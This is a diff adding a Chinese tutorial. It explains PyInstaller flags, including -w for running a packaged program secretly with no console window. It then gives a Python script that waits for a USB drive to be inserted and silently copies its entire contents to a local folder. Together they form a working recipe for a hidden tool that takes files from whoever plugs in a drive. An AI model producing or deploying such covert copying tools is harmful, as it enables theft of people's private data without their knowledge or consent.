@@ -1,0 +1,59 @@
+
+
+
+
+在命令行中直接输入下面的指令即可
+
+pyinstaller [opts] yourprogram.py 
+参数含义
+
+-F    指定打包后只生成一个exe格式的文件(建议写上这个参数)
+
+-D    –onedir 创建一个目录，包含exe文件，但会依赖很多文件（默认选项）
+
+-c    –console, –nowindowed 使用控制台，无界面(默认)
+
+-w    –windowed, –noconsole 使用窗口，无控制台
+
+-p    添加搜索路径，让其找到对应的库。
+
+-i    改变生成程序的icon图标(比如给女朋友写的程序，换个好看的图标，默认的很丑)
+
+实例说明
+
+比如你有个python程序叫test.py，绝对路径在[D:\project]，打包成一个exe格式的文件
+
+pyinstaller -F D:\project\test.py
+条件同上，如果还希望没有控制台的黑框框，在进程中偷偷运行
+
+pyinstaller -F -w D:\project\test.py
+条件同上，如果还希望更换程序图标
+
+pyinstaller -F -w -i D:\project\test.ico D:\project\test.py
+
+
+
+# 复制U盘文件
+# -*- coding:utf-8 -*-
+import os
+import time
+from datetime import datetime
+import shutil
+
+# U盘的盘符
+usb_path = "E:/"
+# 要复制到的路径
+save_path = "D:/haha"
+
+while (True):
+    if os.path.exists(usb_path):
+        shutil.copytree(usb_path, os.path.join(save_path, datetime.now().strftime("%Y%m%d_%H%M%S")))
+        break
+    else:
+        time.sleep(10)
+上面就是所有的代码，代码有两个地方要改成你自己的路径，我在代码里注释了
+
+usb_path就是U盘的盘符，比如你的电脑有C,D盘，那么U盘插上来以后路径就是E盘
+save_path就是你要把复制的文件保存在哪里
+
+
